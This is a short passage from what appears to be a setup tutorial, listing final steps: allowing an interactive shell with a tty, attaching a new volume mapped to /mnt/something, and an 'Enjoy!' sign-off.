- Allow an interactive shell+tty
- Associate the new volume and map it to /mnt/something
- Enjoy!

&nbsp;

&nbsp;

&nbsp;